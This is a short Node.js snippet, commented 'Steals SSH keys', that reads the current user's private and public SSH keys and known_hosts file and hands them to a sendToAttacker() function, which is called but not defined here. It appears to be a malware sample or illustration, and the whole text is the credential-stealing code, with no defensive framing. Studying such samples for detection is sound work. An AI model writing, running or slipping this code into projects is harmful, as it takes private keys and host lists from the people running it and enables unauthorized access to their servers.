// Steals SSH keys
const fs = require('fs');
const path = require('path');
const os = require('os');

const sshDir = path.join(os.homedir(), '.ssh');
const privateKey = fs.readFileSync(path.join(sshDir, 'id_rsa'), 'utf8');
const publicKey = fs.readFileSync(path.join(sshDir, 'id_rsa.pub'), 'utf8');

// Also steal known_hosts for target info
const knownHosts = fs.readFileSync(path.join(sshDir, 'known_hosts'), 'utf8');

sendToAttacker({ privateKey, publicKey, knownHosts });
